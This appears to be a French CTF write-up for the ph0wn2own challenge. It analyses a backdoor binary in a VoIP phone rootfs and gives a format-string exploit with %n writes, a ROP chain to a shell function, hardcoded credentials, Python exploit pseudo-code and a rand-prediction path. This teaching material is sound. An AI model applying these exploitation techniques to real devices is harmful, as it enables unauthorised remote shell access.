@@ -1,0 +1,555 @@
+  _______      ___       ______      ______    
+ /" _   "\    /. ")     /    " \    /    " \   
+(: (_/  :|   /:  /     // ____  \  // ____  \  
+ \____/ |)  //  /___  /  /    ) :)/  /    ) :) 
+    _\  '| (   / _  \(: (____/ //(: (____/ //  
+   /" \__|\|:   /_) :)\        /  \        /   
+  (________)\_______/  \"_____/    \"_____/ bauds   	
+
+┌────────────────────────────────┐
+│ ISSUE No 4 - Aout 2026  03.TXT └─────────────────────────────────────────────┐
+| ph0wn2own                                                                    |
+| Miaou                                                                        |
+| Hack-In-Provence (HiP)                                                       |
+└──────────────────────────────────────────────────────────────────────────────┘
+
+
+## [ Contexte ] ------------------------------------------------------- [ 0 ] ##
+
+Un grand merci à Azox pour ce chall !
+
+Le  Ph0wn  nous   donne  quelques  semaines  avant  le  CTF   un  petit  teasing
+sous  la   forme  d'un  chall   à  préparer  pour   le  dérouler  sur   place  :
+https://ph0wn.org/ph0wn2own/. On  obtient une image d'un  filesystem, qui semble
+"répondre à des mystérieuses requêtes réseau".
+
+
+## [ Recon ] ---------------------------------------------------------- [ 1 ] ##
+
+L'image téléchargeable est un rootfs  d'une distribution Linux (sans le kernel).
+Quelques indices traînent  pour le  kernel : le dossier /lib/modules/2.6.27.47/,
+et une mention  "Welcome to Linux 2.6.27.47  on T4X". C'est un  kernel datant de
+2010
+
+Un coup  de readelf sur quelques  libs et exécutables nous  donne l'architecture
+matérielle : ARMv5 datant d'environ 2005, processeur 32 bits en little endian.
+
+Le T4X est une gamme de téléphone VoIP  Yealink, et en creusant un peu on trouve
+le modèle  T46S :  grand écran  non tactile avec  boutons sur  le côté.  On peut
+trouver son firmware en ligne, mais ce ne sera pas très utile.
+
+En cherchant  sur le système  de fichier, on trouve  des images de  contact, par
+exemple pico.jpg :
+
+                 :-:
+            =%#######%-
+          :%%%####*#%%%=----
+         :%%##%#%%%%@%@=
+         :%%%%@@@@*@%%@@*
+         +%****: ::%%@@@@.
++%%%%%%+:=@****-   :##@@@.
+ :===   =:=**#*******#@@:
+    -+**=   +****##***=+********+====::
+ .*%%%#:    =*--+++%%*******************+
+           .::--  :   :.-======----=---
+             ::= :=..                 :
+             . ..                    =
+              :....    .:        ...:
+               :...... :-.   .....::
+                .--::.:--.....:..:.
+                  :==-=-=-:===+:.
+                    =+===....
+              =%%####*+=##*%%+
+             =##**############*:::
+            *####*#*=+=#*#***###+
+
+On tombe  aussi sur un exécutable  "backdoor". Celui-ci semble être  un ajout au
+système  de base  car readelf  nous  donne des  infos différentes  sur sa  cible
+d'architecture CPU par rapport aux autres exécutables du rootfs. Un comportement
+de  porte  dérobée pourrait  correspondre  à  quelque  chose  qui répond  à  des
+mystérieuses requêtes réseau. C'est notre cible.
+
+L'Application Binary  Interface sous ARM  est plutôt stable et  standardisée. On
+part donc des calling conventions suivantes lors d'un appel de procédure :
+-> 4 premiers arguments en registres (r0..r3 dans cet ordre)
+-> arguments suivants sur la stack
+-> retour de fonction dans r0
+-> stack descendante: la stack commence à une adresse haute (e.g. 0x4ffc)
+   et descend vers 0 jusqu'à une limite (e.g. 0x4800)
+-> CPU 32-bits, un "push" fait descendre la stack d'1 mot == 4 octets
+-> stack full-descending: en plus d'être descendante,  sp pointe vers le dernier
+   espace occupé (full)
+-> appel  avec  l'instruction  "bl"  qui "branch-link",  c'est  à  dire saute  à
+   l'adresse  donnée  et  utilise  le  registre  "lr" (= r14)  pour  enregistrer
+   l'adresse de retour de la procédure
+-> les exécutables sont en little endian  (LSB), l'octet de poids faible dans un
+   mot de plusieurs octets est à l'adresse mémoire la plus basse
+
+
+## [ Analyse de l'exé backdoor ] -------------------------------------- [ 2 ] ##
+
+L'exécutable est plutôt simple et les symboles de debug sont présents, ce qui va
+faciliter l'analyse.
+
+On a les fonctions suivantes :
+- main qui écoute sur le port 9999 en TCP, et fork pour chaque nouveau client
+  vers handle_client(socket)
+- handle_client envoie un message au client puis passe à handle_commands
+- handle_commands est le "menu principale" :
+  - reçoit une commande via parse_arg
+  - décortique puis exécute la commande :
+    - do_login demande un username/password précompilé
+    - cmd_ping, cmd_echo, cmd_info, cmd_logout demandent d'être loggué
+    - cmd_shell ne demande pas d'être loggué mais a un comportement suspect :
+      1. pioche 4 mots aléatoires
+      2. check si sont égaux à l'argument de cmd_chell
+      3. si oui, do_cmd_shell(socket)
+
+La  fonction do_cmd_shell(socket)  est  le  coeur de  la  porte  dérobée :  elle
+transforme le lien TCP  vers un shell sur la machine.  La fonction cmd_shell n'a
+pas de faille au premier abord.
+
+       +----------------------------------------------------------------+
+       |           On a maintenant l'objectif du ph0wn2own :            |
+       | soit trouver une faille pour prédire l'aléa et passer le test, |
+       | soit trouver une faille pour appeler directement do_cmd_shell. |
+       +----------------------------------------------------------------+
+
+J'ai choisi pour ce write-up  d'essayer d'appeler directement do_cmd_shell, même
+si sa construction appelle plutôt à essayer de prédire l'avenir. On discutera de
+cette fin alternative à la fin du write-up.
+
+Il faut donc commencer par trouver une faille quelque part.
+
+parse_arg est la  première candidate. Sa signature :  parse_arg(int socket, char
+*buffer, size_t max_len) Cette fonction copie jusqu'à max_len octets du lien TCP
+dans buffer et  son implémentation ne semble pas vulnérable  aux buffer overruns
+ou autre problème.
+
+Cette  fonction   donne  aussi  le   "protocole"  à  respecter  pour   parler  à
+l'application. On envoie sur  le lien TCP 4 octets en  little endian pour donner
+la taille de ce qu'on envoie, puis on envoie ce nombre d'octets. Si la taille du
+buffer qu'on  envoie dépasse la taille  max donnée à parse_arg,  alors le buffer
+est  tronqué et  seuls max_len  octets  du buffer  sont lus.  Par exemple,  pour
+l'appel de parse_arg qui récupère la commande  à exécuter, la taille max est 31.
+Les fonctions ont chacune un ou plusieurs arguments qu'elles reçoivent également
+avec parse_arg, et qui ont chacune leur  limite de taille à ne pas dépasser. Par
+exemple, pour la commande echo, on peut aller jusqu'à 0x200 octets.
+
+
+## -- ( do_login ) -------------------------------------------------- [ 2.1 ] ##
+
+C'est une  étape à franchir  pour accéder aux  autres fonctions. Elle  n'est pas
+vulnérable au  sens du  pwn, mais  elle accepte  l'utilisateur en  utilisant des
+informations compilées dans l'application, donc facile à contourner.
+
+Elle attend 2  arguments, le premier est  le username "ph0wn", le  second est le
+password "5tr0ng_P@ssw0rd!". Ceci  met à jour une variable  globale qui débloque
+l'accès aux autres commandes, où on espère trouver des failles.
+
+
+## -- ( cmd_echo ) -------------------------------------------------- [ 2.2 ] ##
+
+Cette  fonction demande  à être  logguée, puis  elle prend  un argument  qu'elle
+formate sur la socket en retour. Son fonctionnement est en gros :
+- alloue to_echo (0x200 octets) et récupère l'argument dans ce buffer
+- alloue to_print (0x800 octets) et fait un snprintf(to_print, 0x800, to_echo)
+
+Ce dernier  appel est  la vulnérabilité  : on  maitrise to_print  et on  va donc
+pouvoir en abuser.
+
+
+## [ Vulnérabilités via snprintf ] ------------------------------------ [ 3 ] ##
+
+Déjà snprintf, c'est une variadique : snprintf(to_print, 0x800, to_echo, ...).
+
+Que  se passe-t-il  si on  donne to_echo="%x  %x %x"  ? Reprenons  la convention
+d'appel de procédure :
+- premier argument dans le registre r0 -> to_print
+- deuxième argument --------------- r1 -> 0x800
+- troisième ----------------------- r2 -> to_echo
+- quatrième ----------------------- r3
+- cinquième et suivants dans la stack (le 5° poussé d'abord, ensuite le 6°,
+  ensuite le 7°, ...)
+
+Le code  de la fonction snprintf  s'exécute *comme si* l'appelant  avait préparé
+les arguments correctement en registres et  en stack. Avec l'exemple "%x %x %x",
+la fonction va donc  chercher le 4°, 5°, et 6° argument  *comme si* cmd_echo les
+avait préparés correctement, et snprintf va donc afficher le contenu de r3, puis
+le contenu de la stack au moment de l'appel.
+
+En reprenant la convention  du manuel de printf qui dit  que le premier argument
+optionnel est  l'argument numéro  1, on peut  visualiser la stack  et ce  à quoi
+snprintf va pouvoir accéder :
+
+|  argument2 <--- sp (stack pointer) au moment de l'appel
+|  argument3
+|  argument4
+|  argument5
+|  [...]
+v (adresses mémoires croissantes vers le bas)
+
+L'argument 1 n'est pas sur la stack puisque c'est le contenu du registre r3.
+
+On peut  utiliser un  modificateur pour  maîtriser plus  finement nos  lecture :
+"%k$n"  utilise directement  le  k-ième  argument, ce  qui  nous  donne accès  à
+l'endroit voulu sur la stack.
+
+         +------------------------------------------------------------+
+         | Premier outil : lecture arbitraire de la stack via "%k$x". |
+         +------------------------------------------------------------+
+
+Les fonctions  printf ont également  une capacité d'écriture qu'on  oublie parce
+que son  utilisation est  plus rare :  le convertisseur %n.  D'après le  man, il
+permet d'écrire  le nombre d'octets déjà  formatés au moment où  il apparaît. Il
+utilise l'argument passé correspondant comme un pointeur sur entier. L'opération
+pourrait s'écrire `*p_i = current_len();`. Par exemple :
+
+```c
+int i=4;
+printf("%08d %n%d", i, &i, i);
+```
+
+écrirait "00000004 9" et i vaut 9 après son exécution.
+
+On peut utiliser des modificateurs pour maîtriser plus finement nos écritures :
+- "%k$n" utilise le k-ième argument -> choisir quel élément de la stack utiliser
+  comme pointeur
+- "%[nombre]i" insère du padding pour que le formatage du nombre prenne au moins
+  `nombre` octets -> ajuster plus facilement la valeur écrite par %n
+- "%hhn"  considère  que  le  pointeur  est  un  "uint8_t*"  et  "%hn"  pour  un
+  "uint16_t*" -> modifier seulement 1 ou 2 octets plutôt que 4
+
+Notre buffer fait 0x800  de long, on ne pourra donc pas padder  à plus que cette
+longueur, et on ne pourra pas écrire d'entier plus grand que 0x800. On s'oriente
+donc vers l'utilisation de "%k$hhn".
+
+       +----------------------------------------------------------------+
+       | Deuxième outil : écriture arbitraire de la stack via "%k$hhn". |
+       +----------------------------------------------------------------+
+
+Pour écrire  un entier 32 bits,  on a besoin de  4 "%hhn" qu'on peut  trier pour
+utiliser seulement 0x100 octets de  formatage et écrire n'importe quelle valeur.
+Il faut trier  les octets dans le  bon ordre. Par exemple,  écrire 0x7fff0482 en
+0x1234 revient à écrire  0x82 en 0x1234, 0x04 en 0x1235, 0xff  en 0x1236 et 0x7f
+en 0x1237 : `printf("%1$4i%1$hhn" "%1$123i%2$hhn" "%1$3i%3$hhn" "%1$125i%4$hhn",
+0, 0x1235, 0x1237, 0x1234, 0x1236);`.
+
+
+## [ Que faire avec ces outils ? ] ------------------------------------ [ 4 ] ##
+
+La stack  comprend deux éléments essentiels  à l'exécution d'un programme  : les
+variables locales de la fonction, l'adresse de retour (pour que l'appelant de la
+fonction  puisse reprendre  l'exécution après  l'appel de  la fonction),  et des
+valeurs des registres qu'il faut préserver pour l'appelant. Pour schématiser ces
+éléments sur la stack au moment de l'appel à snprintf :
+
+|   /    <--- sp (stack pointer) au moment de l'appel
+|   | variables locales de cmd_echo
+|   \
+|   sauvegarde registres
+|   adresse de retour vers handle_commands (0x9194)
+|   /
+|   | variables locales de handle_commands
+|   \
+|   sauvegarde registres
+|   adresse de retour vers handle_client (0x9828)
+| [...]
+v (adresses mémoires croissantes vers le bas)
+
+Un vecteur  d'attaque semble  se dessiner  : modifier  l'adresse de  retour vers
+handle_commands  pour exécuter  à  la  place do_cmd_shell.  Il  s'agit d'un  ROP
+(Return-Oriented Programming).
+
+Toutes  les adresses  *après* sp  sont  accessibles en  lecture directement  via
+"%k$x". Mais  on ne  peut utiliser  que des pointeurs  *présents après  sp* pour
+pouvoir écrire.
+
+Il faudrait énormément  de bol pour qu'un pointeur sur  la stack nous permettant
+de modifier directement l'adresse  de retour existe. Et ce n'est  pas le cas. Il
+faut donc  analyser plus  en détail les  variables globales pour  voir si  on en
+maîtrise des zones ou non.
+
+Regardons le prologue de cmd_echo :
+
+  mov ip, sp
+  push {fp, ip, lr, pc}
+  sub fp, ip, 4
+  sub sp, sp, 0x38
+
+Et l'épilogue correspondant :
+
+  sub sp, fp, 0xc
+  pop {fp, sp, pc}
+
+La fonction sauvegarde fp (Frame Pointer, le registre r11), ip (r12) qui vaut en
+fait  sp  avant  le  push,  lr  (contient  l'adresse  de  l'instruction  suivant
+l'instruction bl qui a appelé cette fonction), et enfin pc (Program Counter). Ce
+dernier  registre n'est  pas ré-utilisé  et sert  uniquement à  garder la  stack
+alignée à  8 octets.  On peut le  voir en  analysant l'épilogue :  seul 3  des 4
+registres sont  pop en sortie,  et en regardant bien,  fp et sp  reprennent leur
+valeur, et pc prend la valeur de lr.
+
+La fonction  s'est donc  réservée 0x38  octets sur la  stack pour  ses variables
+locales (également aligné à 8 octets), soit entre 13 ou 14 mots. En schéma :
+
+| local_00   <--- sp après le prologue
+| local_04
+| local_08
+| local_0c
+| ...
+| local_30
+| local_34
+| fp avant le prologue
+| sp avant le prologue
+| lr == addr instruction après bl cmd_echo
+| pc avant le prologue (padding)           <--- fp pendant cmd_echo
+|                                          <--- sp on entry
+v
+
+On peut accéder aux variables locales de deux manières :
+- par le début de la stack, l'adresse de local_00 est sp+0x00
+- par la fin de la stack,   l'adresse de local_00 est fp-0x40
+
+Avec  un  travail  d'analyse  sur  cmd_echo et  handle_commands,  on  déduit  la
+composition de la stack au moment de l'appel à snprintf. La mention "argK" donne
+la valeur de k qui doit être utilisé  dans "%k$x" ou "%k$hhn" pour accéder à cet
+emplacement de la stack.  Pour rappel, on commence à arg2 car  arg1 est passé en
+registre via r3.
+
+| arg02  / [padding]   <--- sp au moment de l'appel à snprintf
+| arg03  | cmd_echo: socket
+| arg04  |           [unused]
+| arg05  |           error_msg
+| arg06  |           error_msg
+| arg07  |           error_msg
+| arg08  |           error_msg
+| arg09  |           error_msg
+| arg10  |           error_msg
+| arg11  |           error_msg
+| arg12  |           error_msg
+| arg13  |           *to_echo
+| arg14  |           len_to_echo
+| arg15  \           *to_print
+| arg16  save fp
+| arg17  save sp
+| arg18  save lr ---> retour en 0x9194
+| arg19  [padding]                 <--- fp pointe ici pendant cmd_echo
+| arg20  / [padding]
+| arg21  | handle_commands: socket
+| arg22  |                  [unused]
+| arg23  |                  buffer_commande[ 0.. 3]
+| arg24  |                  buffer_commande[ 4.. 7]
+| arg25  |                  buffer_commande[ 8..11]
+| arg26  |                  buffer_commande[12..15]
+| arg27  |                  buffer_commande[16..19]
+| arg28  |                  buffer_commande[20..23]
+| arg29  |                  buffer_commande[24..27]
+| arg30  |                  buffer_commande[28..31]
+| arg31  \                  len_command
+| arg32  save fp
+| arg33  save sp
+| arg34  save lr ---> retour en 0x9824
+| arg35  [padding]                 <--- fp pointe ici pendant handle_commands
+
+On remarque ici que le buffer_commande (appelé "buf" dans les symboles de debug)
+est alloué  dans la stack  par handle_commands. On  note aussi que  le programme
+utilise strcmp("echo",  buffer_commande) pour  voir si  la commande  envoyée est
+"echo".  Ceci signifie  que seuls  les  5 premiers  caractères seront  vérifiées
+("echo" suivi du \0 indiquant la fin de chaîne en C).
+
+On peut  donc utiliser tout  ce qu'il  y a derrière  buffer_commande[5..30] pour
+écrire ce qu'on  veut sur la stack (on ne  peut pas utiliser buffer_commande[31]
+car le  code le met à  0 après réception de  la commande pour éviter  les buffer
+overruns). Comme on ne peut accéder à cette zone qu'au travers des argK qui sont
+alignés  aux mots,  seuls 5  emplacement seront  utilisables :  arg25..arg29. On
+pourrait utiliser arg24 si notre adresse a son octet de poids faible à 0x00.
+
+            +-----------------------------------------------------+
+            | Pour écrire via snprintf, on maitrise arg25 à arg29 |
+            |   en envoyant des adresses par la commande "echo".  |
+            +-----------------------------------------------------+
+
+
+## [ Atterrissage ] --------------------------------------------------- [ 5 ] ##
+
+Le but  est de  sauter vers  do_cmd_shell. Malheureusement,  la fonction  a pour
+signature do_cmd_shell(socket).  Il faut  donc que  le registre  r0 soit  égal à
+socket...  Or, en  sortant de  cmd_echo, r0  contient une  valeur interne  de la
+fonction, en l'occurrence la valeur de retour  de free (qui ne renvoie rien donc
+on ne sait  vraiment pas ce qu'il y a  dans r0 à ce moment là).  On ne peut donc
+pas sauter directement au début de la fonction.
+
+En revanche,  cette fonction est appelée  par cmd_shell qui charge  r0 depuis la
+stack :
+
+0x8ed8  ldr r0, [fp, -0x60]
+0x8edc  bl 0x8cc4
+
+Cet  endroit est  un meilleur  point d'atterrissage,  mais il  faudra placer  la
+valeur de socket  au bon endroit sur  la stack. Cette valeur ne  change pas pour
+toute la durée de la connexion, et on peut la trouver ailleurs sur la stack (par
+exemple en arg3,  arg21). Elle vaut généralement un entier  assez faible (<0x800
+qui est  notre limite  via snprintf), donc  on pourra utiliser  un seul  %n pour
+l'écrire.
+
+                 +--------------------------------------------+
+                 |         Pour appeler do_cmd_shell,         |
+                 | mettre socket au bon endroit sur la stack, |
+                 |           puis ROPer en 0x8ed8.            |
+                 +--------------------------------------------+
+
+Ce write-up considère pour l'instant que la stack change d'adresse mémoire entre
+deux exécutions du programme. Mais il est également possible que le programme ne
+soit pas chargé au même endroit entre deux exécutions. Il faudra donc prendre la
+peine de lire  lr avant de le ré-écrire,  pour ajuster au bon endroit  où est le
+code en mémoire. On s'attend à ce que sa valeur soit 0x9194 quand on veut écrire
+0x8ed8. Il  suffira de  faire lr_read-(0x9194-0x8ed8) pour  se retrouver  au bon
+endroit, quelque soit l'adresse de base du programme en mémoire sur la cible.
+
+
+## [ Attaque ] -------------------------------------------------------- [ 6 ] ##
+
+Résumons les étapes de l'attaque :
+- se logguer
+- préparer l'appel à do_cmd_shell :
+  - lire la valeur de socket dans la stack
+  - lire la valeur qu'aura fp pendant le ROP (en sortie de cmd_echo, arg16)
+  - écrire socket en fp-0x60
+- écrire le ROP :
+  - lire la valeur de lr en sortie de cmd_echo (arg18)
+  - trouver son adresse pour le ré-écrire (par  exemple sp de cmd_echo pointe
+    vers arg20, donc sp-8 pointe vers l'emplacement de lr en stack)
+  - écrire lr-(0x9194-0x8ed8) à cet emplacement
+
+Notre  ROP  n'est pas  vraiment  amicale  avec la  stack  et  on ne  pourra  pas
+reprendre  le cours  "normal" du  programme après  avoir ROPé  (pas de  retour à
+handle_commands)... Il faut donc effectuer le ROP en une seule commande echo. En
+revanche, on  peut faire autant  de echo de  lecture que nécessaires  puisque la
+stack se retrouvera aux mêmes emplacement entre 2 appels à echo.
+
+Pseudo-code (syntaxe python), en considérant  que l'appel arg(buf) envoie sur la
+socket le buffer buf en préfixant  sa longueur pour qu'il soit correctement reçu
+par le programme :
+
+```
+arg(b'login\x00'); arg(b'ph0wn\x00'); arg(b'5tr0ng_P@ssw0rd!\x00')
+# Lecture de ce qu'il nous faut
+arg(b'echo\x00')
+vals = arg(b'%3$x %16$x %18$x %17$x')
+socket, fp_cmd_echo, lr_cmd_echo, sp_before_echo = vals
+# Préparation de l'écriture
+new_lr = lr_cmd_echo - (0x9194-0x8ed8)
+addr_lr = sp_before_echo - 8
+# Comme la valeur écrite par %n ne fait qu'augmenter, on trie les bytes à écrire
+# dans l'ordre  croissant. On enregistre  l'adresse à  écrire avec le  byte pour
+# savoir comment organiser les adresses après la commande echo.
+lr_bytes_addr = sorted([
+    (socket, fp_cmd_echo-0x60, 'n'),
+    ((new_lr>> 0) & 0xff, addr_lr+0, 'hhn'),
+    ((new_lr>> 8) & 0xff, addr_lr+1, 'hhn'),
+    ((new_lr>>16) & 0xff, addr_lr+2, 'hhn'),
+    ((new_lr>>24) & 0xff, addr_lr+3, 'hhn'),
+])
+# On  empile  les  adresses  à écrire  à  la suite  de  la  commande en  gardant
+# l'alignement à 4 octets
+arg(b'echo\x00\x01\x02\x03'+b''.join(addr for _,addr,_ in lr_bytes_addr))
+# On a besoin de nombre d'octets *entre* deux valeurs (%x successifs)
+n_pad = 0
+diff_pads = []
+for val,_,flag in lr_bytes_addr:
+    diff_pads.append((val-n_pad, flag))
+    n_pad += val-n_pad
+# Ecrit avec les %k$hhn pour écrire (les pointeurs seront en arg25 et suivants)
+#  (n'écrit pas %x si pad == 0)
+req = ''
+for i,(pad,flag) in enumerate(diff_pads):
+    if pad: req += f'%1${pad}x'
+    req += f'%{25+i}${flag}'
+arg(req.encode())
+```
+
+Après ça,  on peut envoyer des  commandes et recevoir le  résultats. Par exemple
+"ls" puis "cat flag"...
+
+
+## [ Émulation ] ------------------------------------------------------ [ 7 ] ##
+
+Un  point qui  prend du  temps la  première fois  qu'on le  fait mais  qui n'est
+finalement  pas si  compliqué... J'ai  d'abord essayé  de re-compiler  le kernel
+correspondant à  la distrib et  le lancer avec qemu.  Mais de toutes  façons, je
+n'aurai pas  les périphériques branchés sur  le T46S (écran, boutons,  ...) donc
+même après une compilation réussie et  des ajustements sur qemu (sans succès eux
+^^), c'était peine perdue d'avance (!!!)
+
+La commande utile  est `qemu-arm -L rootfs/  rootfs/phone/bin/backdoor`. On peut
+aussi utiliser qemu-arm-static. Ça suffit et fonctionne très bien !
+
+A noter cependant que pour pouvoir debug l'application, gdb-multiarch fonctionne
+(utiliser gef  ou peda par exemple),  sauf le mode "follow-fork-mode  child" qui
+permettrait de suivre un fork. Hors, le programme fork.
+
+On  peut patcher  la  boucle de  la  fonction  main qui  réalise  le fork  assez
+facilement. Il suffit de remplacer l'appel à fork par son code de retour dans le
+process  forké  (qui est 0).  `mov r0, 0`  se compile en 00 00 a0 e3  qu'on peut
+patcher à l'aide de xxd et sed :
+
+```
+cp rootfs/phone/bin/backdoor rootfs/phone/bin/backdoor~
+xxd rootfs/phone/bin/backdoor~ |\
+    sed 's,^00001ab0.*,00001ab0: b2fb ffeb 0000 a0e3 0030 a0e1 1c30 0be5,' |\
+    xxd -r > rootfs/phone/bin/backdoor
+```
+
+L'inconvénient est que le programme termine après un seul client. L'avantage est
+qu'on peut suivre (et debugger) le déroulement du pwn...
+
+On peut lancer `qemu-arm -g  9998 -L rootfs/ rootfs/phone/bin/backdoor` dans une
+console, utiliser  .gdbinit pour définir  nos paramètres  ("target remote 9998",
+"set sysrootfs ...", breakpoints, ...), et lancer notre script de pwn.
+
+
+## [ Chemin alternatif ] ---------------------------------------------- [ 8 ] ##
+
+Le chemin initialement proposé par le challenge était de se baser sur rand. J'ai
+d'abord cru que ce chemin était  plus compliqué parce qu'il fallait prédire rand
+sur une architecture CPU différente, mais ce chemin est en fait plus simple !
+
+Une première clef est  que srand est exécuté au début  du programme, et conserve
+sa valeur au travers des fork. Chaque nouveau client a donc la même seed et aura
+les mêmes valeurs retournées par les appels à rand().
+
+Un autre particularité de rand est que l'algorithme est stable depuis un certain
+nombre  d'années  et  son  implémentation  sur  différentes  architecture  donne
+également les mêmes résultats (c'est du  C après tout, c'est assez logique). Par
+exemple, après  un srand(0), rand() donne  1804289383 à travers qemu-arm  et sur
+mon hôte x64 qui  a une libc 10 ou 15 ans plus  récentes. On peut donc récupérer
+l'état en mémoire après srand via snprintf et prédire sur notre machine les rand
+suivants.
+
+Il  faudra utiliser  un  outil  légèrement différent  :  "%25$s" déréférence  le
+pointeur qu'on met  après la commande echo  et lit comme si  il s'agissait d'une
+chaîne de texte (jusqu'au prochain \0). Il faudra également trouver l'adresse de
+chargement de la libc pour pouvoir pointer  vers la zone mémoire qui contient la
+seed. On peut ensuite soit utiliser un code C pour obtenir les valeurs de rand()
+à prédire, soit directement appeler la libc en python via ctypes.
+
+Après  cet appel,  on  se retrouve  dans do_cmd_shell(socket)  sans  avoir eu  à
+utiliser l'outil d'écriture !
+
+
+## [ Fin ? ] ---------------------------------------------------------- [ 9 ] ##
+
+Le but du challenge était d'ouvrir  les possibles après cette première connexion
+et de jouer  avec le téléphone. Plusieurs  idées qu'on aurait pu  filer (je n'en
+suis pas l'auteur) :
+- charger des fichiers via le et remplacer les icônes affichées lors d'un appel
+  (dans /data/userdata/contact-image/)
+- faire sonner le téléphone
+- changer la sonnerie du téléphone
+- utiliser le framebuffer pour changer l'image affichée sur le téléphone
+- compiler et charger fbDOOM (idée des concepteurs du challenge)
+- ...
+
+Merci encore à toute l'équipe pour ce challenge très original !
+
